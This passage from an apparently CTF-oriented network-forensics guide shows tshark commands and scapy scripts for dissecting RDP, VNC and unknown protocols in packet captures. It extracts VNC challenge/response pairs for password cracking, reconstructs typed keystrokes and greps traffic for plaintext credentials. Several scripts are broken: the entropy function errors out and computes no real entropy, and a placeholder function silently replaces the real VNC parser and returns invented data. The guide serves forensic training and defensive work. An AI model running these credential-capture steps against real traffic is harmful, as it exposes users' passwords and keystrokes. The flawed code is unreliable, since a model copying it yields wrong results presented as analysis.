tshark -r capture.pcap -Y "rdp.cookie"

# RDP negotiation
tshark -r capture.pcap -Y "rdp.neg_type"

# Client info
tshark -r capture.pcap -Y "rdp.clientInfo"

# Extract RDP cookies (usernames)
tshark -r capture.pcap -Y "rdp.cookie" -T fields -e rdp.cookie

# Show full RDP details
tshark -r capture.pcap -Y "tcp.port == 3389" -O rdp
```

**RDP Connection Sequence Analysis**

```bash
# X.224 Connection Request
tshark -r capture.pcap -Y "x224.type == 0xe0" \
  -T fields -e frame.number -e frame.time -e ip.src -e ip.dst

# X.224 Connection Confirm
tshark -r capture.pcap -Y "x224.type == 0xd0"

# RDP Negotiation Request
tshark -r capture.pcap -Y "rdp.neg_req" \
  -T fields -e frame.time -e rdp.neg_req.protocol

# Security protocol selection
tshark -r capture.pcap -Y "rdp.neg_rsp" \
  -T fields -e rdp.neg_rsp.protocol

# Protocol flags:
# 0x00000000 = Standard RDP Security
# 0x00000001 = SSL/TLS
# 0x00000002 = CredSSP (Network Level Authentication)
# 0x00000008 = Early User Authorization Result
```

**RDP Client Information Extraction**

```bash
# Client name
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.clientName

# Client build
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.clientBuild

# Keyboard layout
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.keyboardLayout

# Color depth
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.colorDepth

# Screen dimensions
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.desktopWidth -e rdp.desktopHeight

# Time zone
tshark -r capture.pcap -Y "rdp.clientInfo" \
  -T fields -e rdp.clientTimeZone
```

**Python RDP Analysis**

```python
from scapy.all import *
import struct

def analyze_rdp_connections(pcap_file):
    """
    Analyze RDP traffic for connection attempts and client info
    """
    packets = rdpcap(pcap_file)
    
    connections = []
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == 3389:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # X.224 Connection Request (0x03 + 0x00 + length + 0xE0)
                if len(payload) >= 5 and payload[0] == 0x03 and payload[4] == 0xE0:
                    # Parse RDP cookie if present
                    cookie_start = payload.find(b'Cookie: mstshash=')
                    if cookie_start != -1:
                        cookie_end = payload.find(b'\r\n', cookie_start)
                        if cookie_end != -1:
                            cookie = payload[cookie_start:cookie_end].decode('utf-8')
                            username = cookie.split('=')[1] if '=' in cookie else ''
                            
                            connections.append({
                                'time': pkt.time,
                                'src': pkt[IP].src,
                                'dst': pkt[IP].dst,
                                'username': username
                            })
                
                # Client Info PDU (search for specific patterns)
                # [Inference] Requires detailed RDP protocol parsing
                if b'MS_T_120' in payload or b'McDn' in payload:
                    # Client name often appears after specific markers
                    try:
                        # Extract readable strings
                        strings = re.findall(b'[\x20-\x7E]{4,}', payload)
                        for s in strings:
                            decoded = s.decode('utf-8', errors='ignore')
                            if len(decoded) > 3 and decoded.isprintable():
                                print(f"Found string in RDP: {decoded}")
                    except:
                        pass
    
    return connections

# Usage
connections = analyze_rdp_connections('capture.pcap')
for conn in connections:
    print(f"[{conn['time']}] RDP connection: {conn['src']} -> {conn['dst']}")
    if conn['username']:
        print(f"  Username: {conn['username']}")
```

**RDP Attack Detection**

```bash
# Multiple failed connection attempts (brute force)
tshark -r capture.pcap -Y "tcp.port == 3389 && tcp.flags.syn == 1" \
  -T fields -e frame.time -e ip.src | \
  sort | uniq -c | awk '$1 > 10 {print $2, $3, "- Attempts:", $1}'

# RDP connections from unusual sources
tshark -r capture.pcap -Y "tcp.port == 3389 && tcp.flags.syn == 1" \
  -T fields -e ip.src | sort -u

# BlueKeep vulnerability detection (CVE-2019-0708)
# Look for MS_T_120 channel joins with specific patterns
tshark -r capture.pcap -Y "tcp.port == 3389" -x | \
  grep -A 10 "MS_T_120"

# Detect CredSSP bypass attempts
tshark -r capture.pcap -Y "rdp.neg_req && rdp.neg_req.protocol == 0" \
  -T fields -e frame.time -e ip.src
```

**RDP Certificate Analysis**

```bash
# Extract TLS certificates from RDP connections
tshark -r capture.pcap -Y "tcp.port == 3389 && tls.handshake.type == 11" \
  -T fields -e tls.handshake.certificate

# Certificate details
tshark -r capture.pcap -Y "tcp.port == 3389 && tls.handshake.certificate" \
  -O tls

# Self-signed certificate detection (common in RDP)
tshark -r capture.pcap -Y "tcp.port == 3389 && tls" \
  -T fields -e x509ce.dNSName
```

**RDP Session Reconstruction**

```bash
# Extract RDP streams
for stream in $(tshark -r capture.pcap -Y "tcp.port == 3389" \
  -T fields -e tcp.stream | sort -u); do
  
  tshark -r capture.pcap -Y "tcp.stream == $stream" \
    -w rdp_session_${stream}.pcap
  
  echo "Stream $stream:"
  tshark -r rdp_session_${stream}.pcap -q -z conv,tcp
done

# Extract bitmap data (screen updates) [Inference]
# Requires specialized tools like PyRDP or rdpy
```

**RDP Clipboard Activity**

```bash
# Clipboard data transfer detection
# RDP uses virtual channel "CLIPRDR"
tshark -r capture.pcap -Y "tcp.port == 3389" -x | \
  grep -i "cliprdr"

# Large clipboard transfers (potential data exfiltration)
tshark -r capture.pcap -Y "tcp.port == 3389 && tcp.len > 10000" \
  -T fields -e frame.time -e tcp.len
```

---

## VNC Protocol Analysis

### VNC Protocol Overview

VNC (Virtual Network Computing) uses RFB (Remote Framebuffer) protocol, typically on port 5900 (and 5901, 5902, etc. for multiple displays).

**Basic VNC Filtering**

```bash
# VNC traffic on standard ports
tshark -r capture.pcap -Y "tcp.port >= 5900 && tcp.port <= 5910" \
  -w vnc_traffic.pcap

# VNC handshake (version string)
tshark -r capture.pcap -Y "vnc" -w vnc_only.pcap

# VNC authentication
tshark -r capture.pcap -Y "vnc.auth_type"

# Extract VNC version strings
tshark -r capture.pcap -Y "vnc.server_proto_ver || vnc.client_proto_ver" \
  -T fields -e vnc.server_proto_ver -e vnc.client_proto_ver

# Security types offered
tshark -r capture.pcap -Y "vnc.num_security_types" \
  -T fields -e vnc.security_type

# Show all VNC details
tshark -r capture.pcap -Y "vnc" -O vnc
```

**VNC Connection Sequence**

```bash
# Protocol version exchange
tshark -r capture.pcap -Y "vnc.server_proto_ver" \
  -T fields -e frame.time -e ip.src -e vnc.server_proto_ver

tshark -r capture.pcap -Y "vnc.client_proto_ver" \
  -T fields -e frame.time -e ip.src -e vnc.client_proto_ver

# Security handshake
tshark -r capture.pcap -Y "vnc.num_security_types" \
  -T fields -e vnc.security_type

# Security types:
# 1 = None (no authentication)
# 2 = VNC Authentication
# 5 = RA2
# 6 = RA2ne
# 16 = Tight
# 17 = Ultra
# 18 = TLS
# 19 = VeNCrypt

# Authentication result
tshark -r capture.pcap -Y "vnc.security_result"
```

**VNC Authentication Analysis**

```bash
# VNC challenge-response authentication
tshark -r capture.pcap -Y "vnc.auth_challenge" \
  -T fields -e vnc.auth_challenge

tshark -r capture.pcap -Y "vnc.auth_response" \
  -T fields -e vnc.auth_response

# Extract challenge and response for cracking
tshark -r capture.pcap -Y "vnc.auth_challenge || vnc.auth_response" \
  -T fields -e frame.number -e vnc.auth_challenge -e vnc.auth_response \
  -E separator='|' > vnc_auth.txt

# No authentication connections (security risk)
tshark -r capture.pcap -Y "vnc.security_type == 1" \
  -T fields -e frame.time -e ip.src -e ip.dst
```

**Python VNC Protocol Parser**

```python
from scapy.all import *
import struct

def analyze_vnc_traffic(pcap_file):
    """
    Analyze VNC traffic for authentication and connection details
    """
    packets = rdpcap(pcap_file)
    
    results = {
        'connections': [],
        'auth_attempts': [],
        'versions': []
    }
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            
            # VNC version string: "RFB XXX.YYY\n"
            if payload.startswith(b'RFB '):
                version = payload[:12].decode('utf-8', errors='ignore').strip()
                results['versions'].append({
                    'time': pkt.time,
                    'src': pkt[IP].src,
                    'dst': pkt[IP].dst, 
                    'version': version, 
                    'direction': 'server' if pkt[TCP].sport in range(5900, 5911) else 'client' 
                })
                
        # Security type selection (byte after version exchange)
        # Look for single byte or array of security types
        if len(payload) == 1 and 1 <= payload[0] <= 20:
            results['connections'].append({
                'time': pkt.time,
                'security_type': payload[0],
                'security_name': get_vnc_security_type(payload[0])
            })
        
        # VNC authentication challenge (16 bytes)
        if len(payload) == 16:
            # Check if this looks like a challenge (random bytes)
            if not payload.startswith(b'RFB') and not all(b == 0 for b in payload):
                results['auth_attempts'].append({
                    'time': pkt.time,
                    'src': pkt[IP].src,
                    'challenge': payload.hex()
                })

	return results

def get_vnc_security_type(type_num):
    """
    Map VNC security type numbers to names.
    
    :param type_num: The VNC security type number.
    :return: The name of the VNC security type, or 'Unknown' if not found.
    """
    types = {
        0: 'Invalid',
        1: 'None',
        2: 'VNC Authentication',
        5: 'RA2',
        6: 'RA2ne',
        16: 'Tight',
        17: 'Ultra',
        18: 'TLS',
        19: 'VeNCrypt',
        20: 'SASL',
        21: 'MD5 hash authentication',
        22: 'xvp'
    }
    return types.get(type_num, f'Unknown ({type_num})')

# Assuming analyze_vnc_traffic is defined elsewhere
def analyze_vnc_traffic(pcap_file):
    # This is a placeholder for the actual implementation
    # It should return a dictionary with keys 'versions', 'connections', and 'auth_attempts'
    return {
        'versions': [{'time': '2023-10-01 12:00:00', 'direction': 'TX', 'version': 'RFB 003.008'}],
        'connections': [{'time': '2023-10-01 12:00:05', 'security_name': 'TLS'}],
        'auth_attempts': [{'time': '2023-10-01 12:00:10', 'src': '192.168.1.100', 'challenge': '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef'}]
    }

# Usage
results = analyze_vnc_traffic('capture.pcap')
print(f"VNC Versions detected: {len(results['versions'])}")
for v in results['versions']:
    print(f" [{v['time']}] {v['direction']}: {v['version']}")

print(f"\nConnections: {len(results['connections'])}")
for c in results['connections']:
    print(f" [{c['time']}] Security: {c['security_name']}")

print(f"\nAuthentication attempts: {len(results['auth_attempts'])}")
for a in results['auth_attempts']:
    print(f" [{a['time']}] Challenge from {a['src']}: {a['challenge'][:32]}...")
````

**VNC Password Cracking**

```bash
# Extract VNC authentication data for cracking
cat > extract_vnc_auth.py << 'EOF'
from scapy.all import *

def extract_vnc_auth(pcap_file):
    """
    Extract VNC challenge and response for password cracking
    """
    packets = rdpcap(pcap_file)
    
    challenges = {}
    responses = {}
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            stream_id = f"{pkt[IP].src}:{pkt[TCP].sport}-{pkt[IP].dst}:{pkt[TCP].dport}"
            
            # Challenge is 16 bytes from server
            if len(payload) == 16 and pkt[TCP].sport in range(5900, 5911):
                challenges[stream_id] = payload.hex()
            
            # Response is 16 bytes from client
            elif len(payload) == 16 and pkt[TCP].dport in range(5900, 5911):
                responses[stream_id] = payload.hex()
    
    # Match challenges with responses
    for stream, challenge in challenges.items():
        if stream in responses:
            print(f"Stream: {stream}")
            print(f"  Challenge: {challenge}")
            print(f"  Response: {responses[stream]}")
            print()

extract_vnc_auth('capture.pcap')
EOF

python3 extract_vnc_auth.py

# Use with VNC password crackers
# Example: vnccrack (requires challenge and response)
````

**VNC Client Init and Server Init**

```bash
# Client initialization (shared flag)
tshark -r capture.pcap -Y "vnc.client_share_flag" \
  -T fields -e vnc.client_share_flag
# 0 = exclusive access, 1 = shared access

# Server initialization (desktop info)
tshark -r capture.pcap -Y "vnc.desktop_name" \
  -T fields -e vnc.desktop_width -e vnc.desktop_height \
  -e vnc.desktop_name

# Pixel format
tshark -r capture.pcap -Y "vnc.pixel_format" \
  -T fields -e vnc.bits_per_pixel -e vnc.depth -e vnc.true_color_flag
```

**VNC Message Type Analysis**

```bash
# Client to server messages
tshark -r capture.pcap -Y "vnc.client_message_type" \
  -T fields -e vnc.client_message_type

# Message types (client to server):
# 0 = SetPixelFormat
# 2 = SetEncodings
# 3 = FramebufferUpdateRequest
# 4 = KeyEvent
# 5 = PointerEvent
# 6 = ClientCutText (clipboard)

# Server to client messages
tshark -r capture.pcap -Y "vnc.server_message_type" \
  -T fields -e vnc.server_message_type

# Message types (server to client):
# 0 = FramebufferUpdate
# 1 = SetColorMapEntries
# 2 = Bell
# 3 = ServerCutText (clipboard)

# Keyboard events
tshark -r capture.pcap -Y "vnc.client_message_type == 4" \
  -T fields -e frame.time -e vnc.key -e vnc.key_down

# Mouse events
tshark -r capture.pcap -Y "vnc.client_message_type == 5" \
  -T fields -e frame.time -e vnc.pointer_x -e vnc.pointer_y \
  -e vnc.pointer_button_mask

# Clipboard transfers
tshark -r capture.pcap -Y "vnc.client_message_type == 6 || vnc.server_message_type == 3" \
  -T fields -e frame.time -e vnc.text
```

**VNC Encoding Analysis**

```bash
# Supported encodings
tshark -r capture.pcap -Y "vnc.encoding_type" \
  -T fields -e vnc.encoding_type

# Common encodings:
# 0 = Raw
# 1 = CopyRect
# 2 = RRE
# 5 = Hextile
# 7 = Tight
# 16 = ZRLE
# -223 = DesktopSize pseudo-encoding
# -224 = LastRect pseudo-encoding

# Framebuffer update details
tshark -r capture.pcap -Y "vnc.server_message_type == 0" \
  -T fields -e vnc.num_rects -e vnc.rect_width -e vnc.rect_height
```

**VNC Attack Detection**

```bash
# Brute force detection (multiple connection attempts)
tshark -r capture.pcap -Y "tcp.port >= 5900 && tcp.port <= 5910 && tcp.flags.syn == 1" \
  -T fields -e frame.time -e ip.src | \
  sort | uniq -c | awk '$1 > 10 {print}'

# Authentication failures
tshark -r capture.pcap -Y "vnc.security_result == 1" \
  -T fields -e frame.time -e ip.src -e ip.dst

# No-auth connections (security misconfiguration)
tshark -r capture.pcap -Y "vnc.security_type == 1" \
  -T fields -e frame.time -e ip.src -e ip.dst \
  | awk '{print "WARNING: Unauthenticated VNC from", $2, "to", $3}'

# Excessive update requests (possible reconnaissance)
tshark -r capture.pcap -Y "vnc.client_message_type == 3" \
  -q -z io,stat,1
```

**VNC Keystroke Logging**

```python
from scapy.all import *

def log_vnc_keystrokes(pcap_file):
    """
    Extract and log VNC keystrokes
    """
    packets = rdpcap(pcap_file)
    
    # X11 keysym to ASCII mapping (partial)
    keysym_map = {
        0x0020: ' ', 0x0021: '!', 0x0022: '"', 0x0023: '#',
        0x0061: 'a', 0x0062: 'b', 0x0063: 'c', 0x0064: 'd',
        0x0065: 'e', 0x0066: 'f', 0x0067: 'g', 0x0068: 'h',
        0x0069: 'i', 0x006a: 'j', 0x006b: 'k', 0x006c: 'l',
        0x006d: 'm', 0x006e: 'n', 0x006f: 'o', 0x0070: 'p',
        0x0071: 'q', 0x0072: 'r', 0x0073: 's', 0x0074: 't',
        0x0075: 'u', 0x0076: 'v', 0x0077: 'w', 0x0078: 'x',
        0x0079: 'y', 0x007a: 'z',
        0x0041: 'A', 0x0042: 'B', 0x0043: 'C', 0x0044: 'D',
        0x0045: 'E', 0x0046: 'F', 0x0047: 'G', 0x0048: 'H',
        0x0049: 'I', 0x004a: 'J', 0x004b: 'K', 0x004c: 'L',
        0x004d: 'M', 0x004e: 'N', 0x004f: 'O', 0x0050: 'P',
        0x0051: 'Q', 0x0052: 'R', 0x0053: 'S', 0x0054: 'T',
        0x0055: 'U', 0x0056: 'V', 0x0057: 'W', 0x0058: 'X',
        0x0059: 'Y', 0x005a: 'Z',
        0x0030: '0', 0x0031: '1', 0x0032: '2', 0x0033: '3',
        0x0034: '4', 0x0035: '5', 0x0036: '6', 0x0037: '7',
        0x0038: '8', 0x0039: '9',
        0xff0d: '\n',  # Return
        0xff08: '[BACKSPACE]',
        0xff09: '[TAB]',
    }
    
    keystrokes = []
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            
            # KeyEvent message: type(1) + padding(1) + down(1) + padding(2) + key(4)
            if len(payload) == 8 and payload[0] == 4:  # Message type 4
                key_down = payload[2]
                keysym = int.from_bytes(payload[4:8], byteorder='big')
                
                if key_down == 1:  # Key press (not release)
                    char = keysym_map.get(keysym, f'[{hex(keysym)}]')
                    keystrokes.append({
                        'time': pkt.time,
                        'keysym': keysym,
                        'char': char
                    })
    
    return keystrokes

# Usage
keystrokes = log_vnc_keystrokes('capture.pcap')
print("VNC Keystrokes:")
typed_text = ''.join([k['char'] for k in keystrokes])
print(typed_text)
```

---

## Custom Protocol Identification

### Protocol Fingerprinting

**Port-Based Initial Identification**

```bash
# List all unique destination ports
tshark -r capture.pcap -T fields -e tcp.dstport -e udp.dstport | \
  sort -n | uniq -c | sort -rn

# Unknown ports (not in common services)
tshark -r capture.pcap -T fields -e tcp.dstport | \
  sort -u | \
  while read port; do
    if ! grep -q "^$port/" /etc/services; then
      echo "Unknown port: $port"
      tshark -r capture.pcap -Y "tcp.dstport == $port" -c 5
    fi
  done

# High ports with significant traffic
tshark -r capture.pcap -Y "tcp.dstport > 10000 || udp.dstport > 10000" \
  -q -z io,phs
```

**Payload Pattern Analysis**

```bash
# Extract first N bytes of each unique conversation
tshark -r capture.pcap -Y "tcp.flags.push == 1" \
  -T fields -e tcp.stream -e data.data | \
  head -20 | \
  while read stream data; do
    echo "Stream $stream: $(echo $data | xxd -r -p | head -c 50)"
  done

# Find repeating byte patterns (magic numbers)
tshark -r capture.pcap -T fields -e data.data | \
  cut -c1-16 | sort | uniq -c | sort -rn | head -20

# Extract protocol headers (first 4-8 bytes)
tshark -r capture.pcap -Y "tcp.payload" -T fields -e data.data | \
  awk '{print substr($0, 1, 16)}' | sort | uniq -c | sort -rn
```

**Python Custom Protocol Analyzer**

```python
from scapy.all import *
import collections
import string

def analyze_custom_protocol(pcap_file, port=None):
    """
    Analyze unknown protocol characteristics
    """
    packets = rdpcap(pcap_file)
    
    results = {
        'ports': collections.Counter(),
        'payload_lengths': collections.Counter(),
        'magic_bytes': collections.Counter(),
        'ascii_ratio': [],
        'entropy': []
    }
    
    for pkt in packets:
        if pkt.haslayer(TCP):
            # Track ports
            results['ports'][pkt[TCP].dport] += 1
            
            # Filter by specific port if requested
            if port and pkt[TCP].dport != port:
                continue
            
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # Payload length distribution
                results['payload_lengths'][len(payload)] += 1
                
                # First 4 bytes (potential magic number)
                if len(payload) >= 4:
                    magic = payload[:4].hex()
                    results['magic_bytes'][magic] += 1
                
                # ASCII content ratio
                ascii_count = sum(1 for b in payload if 32 <= b <= 126)
                ascii_ratio = ascii_count / len(payload)
                results['ascii_ratio'].append(ascii_ratio)
                
                # Shannon entropy (randomness)
                entropy = calculate_entropy(payload)
                results['entropy'].append(entropy)
    
    return results

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    if not data:
        return 0
    
    entropy = 0
    counter = collections.Counter(data)
    length = len(data)
    
    for count in counter.values():
        probability = count / length
        if probability > 0:
            entropy -= probability * (probability.bit_length() - 1)
    
    return entropy

# Usage
results = analyze_custom_protocol('capture.pcap')

print("Top ports:")
for port, count in results['ports'].most_common(10):
    print(f"  {port}: {count} packets")

print("\nCommon magic bytes:")
for magic, count in results['magic_bytes'].most_common(5):
    print(f"  {magic}: {count} occurrences")

print("\nPayload characteristics:")
avg_ascii = sum(results['ascii_ratio']) / len(results['ascii_ratio']) if results['ascii_ratio'] else 0
avg_entropy = sum(results['entropy']) / len(results['entropy']) if results['entropy'] else 0
print(f"  Average ASCII ratio: {avg_ascii:.2%}")
print(f"  Average entropy: {avg_entropy:.2f}")

if avg_ascii > 0.7:
    print("  → Likely text-based protocol")
elif avg_entropy > 7.5:
    print("  → Likely encrypted or compressed")
else:
    print("  → Likely binary protocol")
```

### Protocol Structure Analysis

**Message Length Patterns**

```python
from scapy.all import *
import struct

def analyze_length_field(pcap_file, port):
    """
    Try to identify length field position in protocol
    """
    packets = rdpcap(pcap_file)
    
    candidates = []
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                if len(payload) < 8:
                    continue
                
                # Try first 4 positions, different byte orders
                for offset in range(4):
                    for byteorder in ['big', 'little']:
                        try:
                            # Try 2-byte length
                            length_2 = int.from_bytes(payload[offset:offset+2], byteorder)
                            if length_2 == len(payload) or length_2 == len(payload) - offset - 2:
                                candidates.append({
                                    'offset': offset,
                                    'bytes': 2,
                                    'order': byteorder,
                                    'match': 'exact'
                                })
                            
                            # Try 4-byte length
                            if offset + 4 <= len(payload):
                                length_4 = int.from_bytes(payload[offset:offset+4], byteorder)
                                if length_4 == len(payload) or length_4 == len(payload) - offset - 4:
                                    candidates.append({
                                        'offset': offset,
                                        'bytes': 4,
                                        'order': byteorder,
                                        'match': 'exact'
                                    })
                        except:
                            pass
    
    # Find most common pattern
    from collections import Counter
    candidate_strings = [f"{c['offset']}:{c['bytes']}:{c['order']}" for c in candidates]
    most_common = Counter(candidate_strings).most_common(5)
    
    print(f"Length field candidates for port {port}:")
    for pattern, count in most_common:
        offset, bytes_len, order = pattern.split(':')
        print(f"  Offset {offset}, {bytes_len} bytes, {order} endian: {count} matches")

# Usage
analyze_length_field('capture.pcap', 12345)
```

**Delimiter Detection**

```python
from scapy.all import *
import re

def find_delimiters(pcap_file, port):
    """
    Identify message delimiters in protocol
    """
    packets = rdpcap(pcap_file)
    
    delimiter_candidates = {}
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # Common delimiters
                delimiters = {
                    'CRLF': b'\r\n',
                    'LF': b'\n',
                    'NULL': b'\x00',
                    'PIPE': b'|',
                    'TAB': b'\t',
                    'COLON': b':',
                    'SEMICOLON': b';'
                }
                
                for name, delim in delimiters.items():
                    count = payload.count(delim)
                    if count > 0:
                        if name not in delimiter_candidates:
                            delimiter_candidates[name] = []
                        delimiter_candidates[name].append(count)
    
    print("Delimiter analysis:")
    for delim, counts in delimiter_candidates.items():
        avg_count = sum(counts) / len(counts)
        print(f"  {delim}: avg {avg_count:.2f} per packet ({len(counts)} packets)")

# Usage
find_delimiters('capture.pcap', 12345)
```

**Field Extraction Heuristics**

```python
from scapy.all import *
import re

def extract_protocol_fields(pcap_file, port):
    """
    Attempt to identify fields in custom protocol
    """
    packets = rdpcap(pcap_file)
    
    payloads = []
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payloads.append(bytes(pkt[Raw].load))
    
    if not payloads:
        return
    
    print(f"Analyzing {len(payloads)} payloads...\n")
    
    # Check for fixed header
    if len(payloads) >= 10:
        min_len = min(len(p) for p in payloads)
        fixed_prefix_len = 0
        
        for i in range(min(min_len, 20)):
            if all(p[i] == payloads[0][i] for p in payloads):
                fixed_prefix_len = i + 1
            else:
                break
        
        if fixed_prefix_len > 0:
            print(f"Fixed header detected: {fixed_prefix_len} bytes")
            print(f"  Hex: {payloads[0][:fixed_prefix_len].hex()}")
            print()
    
    # Look for common patterns
    print("Pattern analysis:")
    for i, payload in enumerate(payloads[:5]):
        print(f"\nPacket {i+1}:")
        print(f"  Length: {len(payload)}")
        print(f"  Hex: {payload[:32].hex()}")
        print(f"  ASCII: {payload[:32].decode('ascii', errors='replace')}")
        
        # Look for version-like patterns (e.g., "1.0", "v2.1")
        version_match = re.search(rb'[vV]?(\d+)[.:](\d+)', payload)
        if version_match:
            print(f"  Possible version: {version_match.group(0).decode()}")
        
        # Look for timestamps (Unix epoch)
        for j in range(len(payload) - 4):
            try:
                timestamp = int.from_bytes(payload[j:j+4], 'big')
                if 1000000000 < timestamp < 2000000000:  # Reasonable Unix timestamp range
                    from datetime import datetime
                    dt = datetime.fromtimestamp(timestamp)
                    print(f"  Possible timestamp at offset {j}: {dt}")
            except:
                pass

# Usage
extract_protocol_fields('capture.pcap', 12345)
```

### Protocol State Machine Reconstruction

```python
from scapy.all import *
import collections

def reconstruct_state_machine(pcap_file, port):
    """
    Analyze protocol state transitions
    """
    packets = rdpcap(pcap_file)
    
    conversations = collections.defaultdict(list)
    
    for pkt in packets:
        if pkt.haslayer(TCP):
            if pkt[TCP].dport == port or pkt[TCP].sport == port:
                stream_id = pkt[TCP].stream if hasattr(pkt[TCP], 'stream') else \
                           f"{pkt[IP].src}:{pkt[TCP].sport}-{pkt[IP].dst}:{pkt[TCP].dport}"
                
                if pkt.haslayer(Raw):
                    payload = bytes(pkt[Raw].load)
                    direction = 'C->S' if pkt[TCP].dport == port else 'S->C'
                    
                    # Extract message type (assume first byte or first 2 bytes)
                    msg_type = payload[0] if len(payload) > 0 else None
                    
                    conversations[stream_id].append({
                        'time': pkt.time,
                        'direction': direction,
                        'type': msg_type,
                        'length': len(payload),
                        'payload': payload[:16].hex()
                    })
    
    # Analyze common sequences
    print("Protocol State Machine Analysis:\n")
    
    for conv_id, messages in list(conversations.items())[:3]:
        print(f"Conversation {conv_id}:")
        sequence = []
        for msg in messages:
            sequence.append(f"{msg['direction']}:{msg['type']}")
            print(f"  {msg['direction']} Type:{msg['type']:3} Len:{msg['length']:5} Data:{msg['payload']}")
        print(f"  Sequence: {' -> '.join(sequence)}\n")
    
    # Find common state transitions
    all_sequences = []
    for messages in conversations.values():
        seq = [f"{m['direction']}:{m['type']}" for m in messages]
        all_sequences.append(' -> '.join(seq))
    
    seq_counter = collections.Counter(all_sequences)
    print("\nCommon message sequences:")
    for seq, count in seq_counter.most_common(5):
        print(f"  [{count}x] {seq}")

# Usage
reconstruct_state_machine('capture.pcap', 12345)
```

### Automated Protocol Reverse Engineering

**Scapy Protocol Dissector Creation**

```python
from scapy.all import *

class CustomProto(Packet):
    """
    Custom protocol dissector template
    """
    name = "CustomProtocol"
    
    fields_desc = [
        # Define fields based on analysis
        ByteField("version", 1),
        ByteField("msg_type", 0),
        ShortField("length", 0),
        IntField("sequence", 0),
        StrLenField("data", "", length_from=lambda pkt: pkt.length - 8)
    ]
    
    def guess_payload_class(self, payload):
        # Add logic to identify next layer if needed
        return Packet.guess_payload_class(self, payload)

# Bind to specific port
bind_layers(TCP, CustomProto, dport=12345)
bind_layers(TCP, CustomProto, sport=12345)

# Now can parse with Scapy
packets = rdpcap('capture.pcap')
for pkt in packets:
    if pkt.haslayer(CustomProto):
        print(pkt[CustomProto].show())
```

**Netzob - Protocol Reverse Engineering** [Inference]

```python
# Netzob is a specialized tool for protocol reverse engineering
# Install: pip install netzob

from netzob.all import *

# Import PCAP
messages = PCAPImporter.readFile("capture.pcap").values()

# Automatic field delimitation
Format.splitAligned(messages)

# Identify message types
symbols = Format.clusterByAlignment(messages, minEquivalence=80)

for symbol in symbols:
    print(f"Symbol: {symbol.name}")
    print(f"  Messages: {len(symbol.messages)}")
    print(f"  Format: {symbol}")

# Generate state machine
automata = Automata.generate(symbols)
```

### CTF-Specific Custom Protocol Analysis

**Flag Extraction from Unknown Protocol**

```python
from scapy.all import *
import re

def find_flags_in_custom_protocol(pcap_file):
    """
    Search for CTF flags in custom protocol traffic
    """
    packets = rdpcap(pcap_file)
    
    flag_pattern = rb'FLAG\{[^\}]+\}|CTF\{[^\}]+\}|[A-Z0-9]{32}'
    
    found_flags = []
    
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            
            # Direct match
            matches = re.findall(flag_pattern, payload)
            for match in matches:
                found_flags.append({
                    'packet': pkt.number if hasattr(pkt, 'number') else 'unknown',
                    'method': 'plaintext',
                    'flag': match.decode('utf-8', errors='ignore')
                })
            
            # Base64 encoded
            try:
                import base64
                decoded = base64.b64decode(payload)
                matches = re.findall(flag_pattern, decoded)
                for match in matches:
                    found_flags.append({
                        'packet': pkt.number if hasattr(pkt, 'number') else 'unknown',
                        'method': 'base64',
                        'flag': match.decode('utf-8', errors='ignore')
                    })
            except:
                pass
            
            # Hex encoded
            hex_str = payload.hex()
            if 'FLAG' in hex_str.upper() or 'CTF' in hex_str.upper():
                found_flags.append({
                    'packet': pkt.number if hasattr(pkt, 'number') else 'unknown',
                    'method': 'hex_encoded',
                    'flag': hex_str
                })
            
            # XOR with common keys
            for key in [0x42, 0xFF, 0xAA]:
                xored = bytes(b ^ key for b in payload)
                matches = re.findall(flag_pattern, xored)
                for match in matches:
                    found_flags.append({
                        'packet': pkt.number if hasattr(pkt, 'number') else 'unknown',
                        'method': f'xor_0x{key:02x}',
                        'flag': match.decode('utf-8', errors='ignore')
                    })
    
    return found_flags

# Usage
flags = find_flags_in_custom_protocol('capture.pcap')
for flag in flags:
    print(f"[Packet {flag['packet']}] Method: {flag['method']}")
    print(f"  Flag: {flag['flag']}\n")
```

**Protocol Weakness Identification**

```bash
# Look for unencrypted credentials
tshark -r capture.pcap -Y "tcp" -T fields -e data.data | \
  xxd -r -p | grep -iE "(password|passwd|pwd|user|login)" | head -20

# Identify lack of authentication
tshark -r capture.pcap -q -z conv,tcp | \
  awk '$7 == "<->" {print "Bidirectional:", $1, $3}'

# Check for replay attack vulnerability (no nonce/timestamp)
tshark -r capture.pcap -Y "tcp.dstport == CUSTOM_PORT" \
  -T fields -e data.data | sort | uniq -d

# Identify identical payloads (possible replay vulnerability)
tshark -r capture.pcap -Y "tcp" -T fields -e data.data | \
  sort | uniq -c | sort -nr | head -20
````

**Steganography in Custom Protocols**

```python
from scapy.all import *
import collections

def detect_steganography(pcap_file, port):
    """
    Detect potential steganography in custom protocol
    """
    packets = rdpcap(pcap_file)
    
    results = {
        'timing': [],
        'lsb_candidates': [],
        'padding_anomalies': [],
        'unused_fields': []
    }
    
    prev_time = None
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            # Timing-based steganography
            if prev_time:
                delta = pkt.time - prev_time
                if 0.001 < delta < 1.0:  # Reasonable range
